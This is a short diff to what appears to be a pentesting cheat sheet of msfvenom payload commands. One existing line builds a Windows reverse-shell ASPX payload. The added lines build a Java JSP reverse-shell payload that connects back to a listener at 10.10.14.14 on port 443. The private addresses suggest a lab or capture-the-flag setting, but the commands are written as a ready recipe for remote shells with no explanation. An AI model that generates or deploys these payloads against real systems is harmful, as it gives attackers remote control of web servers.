@@ -12,3 +12,11 @@ If we want output in txt format, then use below command
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.19 LPORT=5555 --platform windows -a x86 -e generic/none -f aspx -o go.txt
 ```
 
+Java JSP payload
+```
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 -f raw > exp.jsp
+```
+
+
+
+
